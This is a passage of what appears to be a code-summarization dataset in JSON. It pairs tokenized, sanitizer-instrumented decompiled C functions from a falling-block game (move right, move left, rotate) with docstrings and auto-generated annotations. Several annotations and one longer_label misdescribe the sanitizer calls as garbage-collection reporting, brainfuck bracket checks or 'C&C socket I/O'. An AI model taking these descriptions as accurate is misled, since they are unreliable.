            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22D5E0",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "m",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "4",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "m",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "m",
            ")",
            ";",
            "}",
            "m",
            "=",
            "g",
            "-",
            ">",
            "m",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22D640",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "g",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "g",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "g",
            ")",
            ";",
            "}",
            "if",
            "(",
            "!",
            "colision",
            "(",
            "g",
            "-",
            ">",
            "n",
            ",",
            "m",
            ",",
            "v5",
            ",",
            "y",
            ",",
            "g",
            "-",
            ">",
            "shape",
            ",",
            "(",
            "cell_0",
            "(",
            "*",
            ")",
            "[",
            "]",
            ")",
            "g",
            "-",
            ">",
            "grid",
            ")",
            ")",
            "{",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22D6A0",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "x",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "20",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "x",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "x",
            ")",
            ";",
            "}",
            "v7",
            "=",
            "g",
            "-",
            ">",
            "x",
            ";",
            "v3",
            "=",
            "__OFSUB__",
            "(",
            "v7",
            ",",
            "1",
            ")",
            ";",
            "v8",
            "=",
            "v7",
            "-",
            "1",
            ";",
            "if",
            "(",
            "v3",
            ")",
            "__ubsan_handle_sub_overflow",
            "(",
            "&",
            "off_22D7A0",
            ",",
            "g",
            "-",
            ">",
            "x",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22D700",
            ",",
            "g",
            ")",
            ";",
            "g",
            "-",
            ">",
            "x",
            "=",
            "v8",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The \"handle\" function seems to be involved in creating a context for interception, possibly related to handling mouse input data and errors, as well as managing UTF-8 strings in Awk, likely for some form of input/output interception or manipulation.",
            "The \"mismatch\" function seems to handle error reporting or validation checks related to various mismatches or discrepancies within a program, such as bracket mismatches in a brainfuck compiler or mismatches in system call parameters and error codes.",
            "The \"report\" function likely serves to facilitate reporting or logging of garbage collection statistics and debugging information, potentially with variable arguments for flexible output formatting, within the context of a larger memory management system implemented in C."
        ],
        "longer_label": "The code appears to be a low-level function for moving an object within a game, while also implementing error handling and reporting for mismatches and memory access."
    },
    {
        "id": 215,
        "docstring_tokens": [
            "The",
            "function",
            "`",
            "moveRight",
            "`",
            "increments",
            "the",
            "x-coordinate",
            "of",
            "the",
            "game",
            "object",
            "by",
            "1",
            "if",
            "there",
            "is",
            "no",
            "collision",
            "with",
            "the",
            "grid",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "game_0",
            "*",
            "g",
            ")",
            "{",
            "int",
            "y",
            ";",
            "int",
            "x",
            ";",
            "bool",
            "v3",
            ";",
            "int",
            "v4",
            ";",
            "int",
            "v5",
            ";",
            "int",
            "m",
            ";",
            "int",
            "v7",
            ";",
            "int",
            "v8",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22D7E0",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "y",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "24",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "y",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "y",
            ")",
            ";",
            "}",
            "y",
            "=",
            "g",
            "-",
            ">",
            "y",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22D840",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "x",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "20",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "x",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "x",
            ")",
            ";",
            "}",
            "x",
            "=",
            "g",
            "-",
            ">",
            "x",
            ";",
            "v3",
            "=",
            "__OFADD__",
            "(",
            "1",
            ",",
            "x",
            ")",
            ";",
            "v4",
            "=",
            "x",
            "+",
            "1",
            ";",
            "if",
            "(",
            "v3",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_22DA20",
            ",",
            "g",
            "-",
            ">",
            "x",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "v5",
            "=",
            "v4",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22D8A0",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "m",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "4",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "m",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "m",
            ")",
            ";",
            "}",
            "m",
            "=",
            "g",
            "-",
            ">",
            "m",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22D900",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "g",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "g",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "g",
            ")",
            ";",
            "}",
            "if",
            "(",
            "!",
            "colision",
            "(",
            "g",
            "-",
            ">",
            "n",
            ",",
            "m",
            ",",
            "v5",
            ",",
            "y",
            ",",
            "g",
            "-",
            ">",
            "shape",
            ",",
            "(",
            "cell_0",
            "(",
            "*",
            ")",
            "[",
            "]",
            ")",
            "g",
            "-",
            ">",
            "grid",
            ")",
            ")",
            "{",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22D960",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "x",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "20",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "x",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "x",
            ")",
            ";",
            "}",
            "v7",
            "=",
            "g",
            "-",
            ">",
            "x",
            ";",
            "v3",
            "=",
            "__OFADD__",
            "(",
            "1",
            ",",
            "v7",
            ")",
            ";",
            "v8",
            "=",
            "v7",
            "+",
            "1",
            ";",
            "if",
            "(",
            "v3",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_22DA60",
            ",",
            "g",
            "-",
            ">",
            "x",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22D9C0",
            ",",
            "g",
            ")",
            ";",
            "g",
            "-",
            ">",
            "x",
            "=",
            "v8",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function \"san_handle\" is used to handle various types of errors and violations, such as add overflow, alignment assumption, and unreachable code, in the code generation part of a program, as well as to manage C&C socket I/O and flash codes.",
            "The \"report\" function is likely used for reporting garbage collection (gc) statistics and debugging information, including initialization of flows and reporting of statistics through macros and utility functions defined in the given code snippets."
        ],
        "longer_label": "The provided code appears to be a C function called \"moveRight\" within a game program, which includes error handling for various types of violations like add overflow and type mismatches, along with possible reporting functions for garbage collection statistics and debugging information."
    },
    {
        "id": 216,
        "docstring_tokens": [
            "This",
            "code",
            "rotates",
            "the",
            "shape",
            "in",
            "a",
            "game",
            "if",
            "there",
            "is",
            "no",
            "collision",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "game_0",
            "*",
            "g",
            ")",
            "{",
            "int",
            "ms",
            ";",
            "int",
            "ns",
            ";",
            "void",
            "*",
            "v3",
            ";",
            "cell",
            "(",
            "*",
            "shape",
            ")",
            "[",
            "4",
            "]",
            ";",
            "int",
            "v5",
            ";",
            "cell",
            "(",
            "*",
            "grid",
            ")",
            "[",
            "10",
            "]",
            ";",
            "cell_0",
            "(",
            "*",
            "v7",
            ")",
            "[",
            "]",
            "[",
            "]",
            ";",
            "int",
            "y",
            ";",
            "int",
            "x",
            ";",
            "int",
            "m",
            ";",
            "cell_0",
            "(",
            "*",
            "v11",
            ")",
            "[",
            "]",
            "[",
            "]",
            ";",
            "cell",
            "(",
            "*",
            "v12",
            ")",
            "[",
            "4",
            "]",
            ";",
            "int",
            "v13",
            ";",
            "__int64",
            "v14",
            "[",
            "9",
            "]",
            ";",
            "game_0",
            "*",
            "ga",
            ";",
            "__int64",
            "v16",
            ";",
            "__int64",
            "v17",
            ";",
            "cell_0",
            "(",
            "*",
            "p_newShape",
            ")",
            "[",
            "]",
            "[",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v19",
            ";",
            "ga",
            "=",
            "g",
            ";",
            "v19",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "v14",
            "[",
            "8",
            "]",
            "=",
            "(",
            "__int64",
            ")",
            "v14",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22DB20",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "ga",
            "-",
            ">",
            "ms",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "ga",
            "+",
            "12",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "ga",
            "-",
            ">",
            "ms",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "ga",
            "-",
            ">",
            "ms",
            ")",
            ";",
            "}",
            "ms",
            "=",
            "ga",
            "-",
            ">",
            "ms",
            ";",
            "if",
            "(",
            "ms",
            "<",
            "=",
            "0",
            ")",
            "__ubsan_handle_vla_bound_not_positive",
            "(",
            "&",
            "off_22DAA0",
            ",",
            "ms",
            ")",
            ";",
            "if",
            "(",
            "!",
            "ga",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "ga",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22DB80",
            ",",
            "ga",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "ga",
            "-",
            ">",
            "ns",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "ga",
            "+",
            "8",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "ga",
            "-",
            ">",
            "ns",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "ga",
            "-",
            ">",
            "ns",
            ")",
            ";",
            "}",
            "ns",
            "=",
            "ga",
            "-",
            ">",
            "ns",
            ";",
            "if",
            "(",
            "ns",
            "<",
            "=",
            "0",
            ")",
            "__ubsan_handle_vla_bound_not_positive",
            "(",
            "&",
            "off_22DAE0",
            ",",
            "ns",
            ")",
            ";",
            "if",
            "(",
            "__OFSUB__",
            "(",
            "ms",
            ",",
            "1L",
            "L",
            ")",
            ")",
            "__ubsan_handle_sub_overflow",
            "(",
            "&",
            "off_22DEE0",
            ",",
            "ms",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "v16",
            "=",
            "ms",
            "-",
            "1L",
            "L",
            ";",
            "v14",
            "[",
            "0",
            "]",
            "=",
            "ms",
            ";",
            "v14",
            "[",
            "1",
            "]",
            "=",
            "0L",
            "L",
            ";",
            "if",
            "(",
            "__OFSUB__",
            "(",
            "ns",
            ",",
            "1L",
            "L",
            ")",
            ")",
            "__ubsan_handle_sub_overflow",
            "(",
            "&",
            "off_22DF20",
            ",",
            "ns",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "v17",
            "=",
            "ns",
            "-",
            "1L",
            "L",
            ";",
            "v14",
            "[",
            "6",
            "]",
            "=",
            "ms",
            ";",
            "v14",
            "[",
            "7",
            "]",
            "=",
            "0L",
            "L",
            ";",
            "v14",
            "[",
            "4",
            "]",
            "=",
            "ns",
            ";",
            "v14",
            "[",
            "5",
            "]",
            "=",
            "0L",
            "L",
            ";",
            "v14",
            "[",
            "2",
            "]",
            "=",
            "ms",
            ";",
            "v14",
            "[",
            "3",
            "]",
            "=",
            "0L",
            "L",
            ";",
            "v3",
            "=",
            "alloca",
            "(",
            "16",
            "*",
            "(",
            "(",
            "16",
            "*",
            "ms",
            "*",
            "(",
            "__int64",
            ")",
            "ns",
            "+",
            "18",
            ")",
            "/",
            "0x10uL",
            "L",
            ")",
            ")",
            ";",
            "p_newShape",
            "=",
            "(",
            "cell_0",
            "(",
            "*",
            ")",
            "[",
            "]",
            "[",
            "]",
            ")",
            "v14",
            ";",
            "shape",
            "=",
            "ga",
            "-",
            ">",
            "shape",
            ";",
            "if",
            "(",
            "!",
            "ga",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "ga",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22DBE0",
            ",",
            "ga",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "ga",
            "-",
            ">",
            "ms",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "ga",
            "+",
            "12",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "ga",
            "-",
            ">",
            "ms",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "ga",
            "-",
            ">",
            "ms",
            ")",
            ";",
            "}",
            "v5",
            "=",
            "ga",
            "-",
            ">",
            "ms",
            ";",
            "if",
            "(",
            "!",
            "ga",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "ga",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22DC40",
            ",",
            "ga",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "ga",
            "-",
            ">",
            "ns",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "ga",
            "+",
            "8",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "ga",
            "-",
            ">",
            "ns",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "ga",
            "-",
            ">",
            "ns",
            ")",
            ";",
            "}",
            "copyMatrix",
            "(",
            "ga",
            "-",
            ">",
            "ns",
            ",",
            "v5",
            ",",
            "(",
            "cell_0",
            "(",
            "*",
            ")",
            "[",
            "]",
            ")",
            "v14",
            ",",
            "(",
            "cell_0",
            "(",
            "*",
            ")",
            "[",
            "]",
            ")",
            "shape",
            ")",
            ";",
            "rotateLeft",
            "(",
            "(",
            "cell_0",
            "(",
            "*",
            ")",
            "[",
            "4",
            "]",
            ")",
            "p_newShape",
            ")",
            ";",
            "grid",
            "=",
            "ga",
            "-",
            ">",
            "grid",
            ";",
            "v7",
            "=",
            "p_newShape",
            ";",
            "if",
            "(",
            "!",
            "ga",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "ga",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22DCA0",
            ",",
            "ga",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "ga",
            "-",
            ">",
            "y",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "ga",
            "+",
            "24",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "ga",
            "-",
            ">",
            "y",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "ga",
            "-",
            ">",
            "y",
            ")",
            ";",
            "}",
            "y",
            "=",
            "ga",
            "-",
            ">",
            "y",
            ";",
            "if",
            "(",
            "!",
            "ga",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "ga",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22DD00",
            ",",
            "ga",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "ga",
            "-",
            ">",
            "x",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "ga",
            "+",
            "20",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "ga",
            "-",
            ">",
            "x",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "ga",
            "-",
            ">",
            "x",
            ")",
            ";",
            "}",
            "x",
            "=",
            "ga",
            "-",
            ">",
            "x",
            ";",
            "if",
            "(",
            "!",
            "ga",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "ga",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22DD60",
            ",",
            "ga",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "ga",
            "-",
            ">",
            "m",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "ga",
            "+",
            "4",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "ga",
            "-",
            ">",
            "m",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "ga",
            "-",
            ">",
            "m",
            ")",
            ";",
            "}",
            "m",
            "=",
            "ga",
            "-",
            ">",
            "m",
            ";",
            "if",
            "(",
            "!",
            "ga",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "ga",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22DDC0",
            ",",
            "ga",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "ga",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "ga",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "ga",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "ga",
            ")",
            ";",
            "}",
            "if",
            "(",
            "!",
            "colision",
            "(",
            "ga",
            "-",
            ">",
